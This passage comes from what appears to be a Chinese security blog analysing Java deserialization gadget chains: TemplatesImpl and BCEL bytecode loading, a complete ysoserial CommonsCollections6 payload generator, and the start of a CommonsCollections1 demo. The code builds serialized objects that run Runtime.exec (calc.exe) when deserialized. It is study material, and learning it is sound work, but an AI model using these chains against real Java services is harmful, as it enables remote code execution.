Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;base64&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123; code &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;NOT NULL&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>); <span class="comment">// 允许访问私有字段</span></span><br><span class="line">        field.set(obj, value);    <span class="comment">// 设置字段值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64的部分填我们构造的恶意类的字节码的base64：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomTransletClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomTransletClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;CustomTransletClass loaded&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里作为<code>AbstractTranslet</code>的子类，<br>是为了防止触发<code>TemplatesImpl</code>类加载器的某些错误<br>后面遇到了再细研究</p><h3 id="BCEL-ClassLoader-加载字节码"><a href="#BCEL-ClassLoader-加载字节码" class="headerlink" title="BCEL ClassLoader 加载字节码"></a>BCEL ClassLoader 加载字节码</h3><p>看看源码:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// First try: lookup hash table.</span></span><br><span class="line">    cl = (Class) classes.get(class_name);</span><br><span class="line">    <span class="keyword">if</span> (cl == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// Second try: Load system class using system class loader. You better don&#x27;t mess around with them.for (int i = 0; i &lt; ignored_packages.length; i++) &#123;</span></span><br><span class="line">            <span class="keyword">if</span> (class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">                cl = deferTo.loadClass(class_name);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cl == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Third try: Special request?if (class_name.indexOf(&quot;$$BCEL$$&quot;) &gt;= 0) &#123;</span></span><br><span class="line">                clazz = createClass(class_name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;<span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">                clazz = repository.loadClass(class_name);</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = modifyClass(clazz);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = clazz.getBytes();</span><br><span class="line">                cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;<span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">                cl = Class.forName(class_name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写了<code>loadclass</code>方法<br>源码注释中注明了四次加载尝试，简单梳理一下这个过程：</p><ol><li>首先尝试从 classes（哈希表）中查找是否已经加载过这个类。如果找到了就直接返回</li><li>如果缓存中没有找到，方法会进行第二次尝试：加载系统类。它会遍历 <code>ignored_packages</code> 的字符串数组，这个数组里存放着一些包名的前缀（<code>&quot;java.&quot;, &quot;javax.&quot;, &quot;sun.&quot;</code>）。如果要加载的类名以这些前缀开头，那么这个类就被认为是系统类，会通过调用另一个类加载器 <code>deferTo</code> 的 <code>loadClass</code> 方法来加载。这样做应该是为了避免自定义的类加载器干扰到系统类的加载</li><li>如果仍然没有加载成功，方法会进行第三次尝试，处理一个特殊请求：若类名以 <code>$$BCEL$$</code> 开头则调用 <code>createClass()</code> 创建一个类，这个方法将 BCEL 字节码转换成 JavaClass 对象</li><li>不以 <code>$$BCEL$$</code> 开头则通过一个 repository 加载类</li><li>如果上面两步成功获取到了 Class 对象（无论是创建的还是从 repository 加载的），就会调用 <code>defineClass()</code></li><li>上述步骤都失败则使用默认类加载器 <code>Class.forName()</code></li></ol><p>为了创建用于被加载的 BCEL 字节码，可以用 BCEL 提供的两个类 <code>Repository</code> <code>Utility</code></p><ul><li><code>Repository.lookup()</code> 可以加载一个类，解析为 JavaClass 对象</li><li><code>Utility.encode()</code> 将 JavaClass 对象转换成 BCEL 字节码</li></ul><p>简单的demo：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BCELExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(CustomClass.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—CommonsCollections6</title>
      <link href="/2025/03/27/java-cc6/"/>
      <url>/2025/03/27/java-cc6/</url>
      
        <content type="html"><![CDATA[<p>在java的8u71版本后，<code>AnnotationInvocationHandler</code><br>类的<code>readObject</code>方法逻辑变化了<br>这就导致了我们的CC1链子失效<br>所以这里有另一种链子较为通用<br>：<code>ysoserial</code>的<code>CommonsCollections6</code>:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Step 1: 构造Transformer链（最终触发Runtime.exec）</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 2: 创建LazyMap并关联Transformer链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 3: 将LazyMap封装到TiedMapEntry中</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 4: 将TiedMapEntry放入HashMap以触发反序列化链</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 5: 移除LazyMap中的缓存，确保反序列化时触发链</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 6: 生成恶意序列化数据</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 7: 模拟反序列化攻击（触发漏洞）</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();  <span class="comment">// 此处弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h2><ul><li><strong>翻译器链子</strong></li></ul><p>这个还是和CC1最后一样，<br>反射调用到<code>Runtime</code>进行命令执行：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>实际上执行的操作:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>此时如果执行:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">chain.transform(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure><p>则弹出计算器</p><ul><li><strong>LazyMap</strong><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 2: 创建LazyMap并关联Transformer链</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br></pre></td></tr></table></figure>这个类的作用是实现一个懒加载<br>怎么实现的呢？<br>看看它的构造方法以及<code>get()</code>方法：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">                map.put(key, value);</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>可见生成对象的时候可以传入一个翻译器作为值加工厂<br>当从<code>LazyMap</code>里get值的时候</li></ul><p>如果没有get到，就会根据键名加工出一个值（<code>value</code>）来<br>返回并加到map中<br>这就实现了翻译操作的触发</p><p>这时候触发弹出计算器的操作：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap.get(<span class="string">&quot;ciallo&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>TiedMapEntry</strong></li></ul><p>其设计初衷是简化键值对的绑定操作，并提供延迟加载或动态计算的特性。<br>在实际开发中，它的应用场景相对有限，但在特定需求下可以发挥独特作用。<br>当需要按需生成或加载某些资源（如缓存数据、动态配置）时，<br>结合<code>LazyMap</code>使用<code>TiedMapEntry</code>，<br>可以避免一次性加载所有数据，减少资源消耗</p><p>使用例子：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个 Transformer，按需生成 Value</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">lazyTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Transformer</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟耗时操作（如数据库查询）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Generating value for key: &quot;</span> + key);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Value_&quot;</span> + key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 LazyMap，绑定自定义 Transformer</span></span><br><span class="line">Map&lt;String, Object&gt; lazyMap = LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), lazyTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定键与 LazyMap</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;user_123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 首次调用 getValue() 触发延迟加载</span></span><br><span class="line">System.out.println(tiedEntry.getValue()); </span><br><span class="line"><span class="comment">// 输出: Generating value for key: user_123 → Value_user_123</span></span><br><span class="line"></span><br><span class="line">System.out.println(tiedEntry.getValue()); </span><br><span class="line"><span class="comment">// 直接返回缓存值 → Value_user_123</span></span><br></pre></td></tr></table></figure><p>一般与<code>LazyMap</code>绑定使用<br>他的<code>hashcode</code>方法中调用了触发<code>LazyMap</code>的<code>get</code><br>他的构造方法、<code>hashcode</code>以及<code>getvalue</code>方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">                (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们找一找怎么调用他的<code>hashcode</code><br>这个东西非常眼熟<br>我们在<code>URLDNS</code>链子里一起看过<br>现在目标就从调用<code>URL</code>类的<code>hashcode</code><br>转换为了<code>TiedMapEntry</code>的<code>hashcode</code><br>弹出计算器的操作：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">entry.hashCode();</span><br></pre></td></tr></table></figure><ul><li><strong>HashMap</strong><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 5: 移除LazyMap中的缓存，确保反序列化时触发链</span></span><br><span class="line">lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><p>之后序列化即可:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 6: 生成恶意序列化数据</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">oos.writeObject(hashMap);</span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 7: 模拟反序列化攻击（触发漏洞）</span></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">ois.readObject();  <span class="comment">// 此处弹出计算器</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—CommonsCollections1</title>
      <link href="/2025/03/26/java-cc1/"/>
      <url>/2025/03/26/java-cc1/</url>
      
        <content type="html"><![CDATA[<h3 id="一个触发命令执行的Demo"><a href="#一个触发命令执行的Demo" class="headerlink" title="一个触发命令执行的Demo"></a>一个触发命令执行的Demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">        transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="利用CC链中的翻译器类-Transformer-进行命令执行"><a href="#利用CC链中的翻译器类-Transformer-进行命令执行" class="headerlink" title="利用CC链中的翻译器类(Transformer)进行命令执行"></a>利用CC链中的翻译器类(Transformer)进行命令执行</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>前面部分定义了一个<code>Transformer</code>的数组<br>其中包含两个<code>Transformer</code>：</p><p><strong>1.</strong> <code>ConstantTransformer</code>：返回常量的翻译器，<br>此处传入了可执行命令的<code>Runtime</code>对象<br>也就是无论往翻译器里传入什么，都只会返回<code>Runtime</code>对象：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> 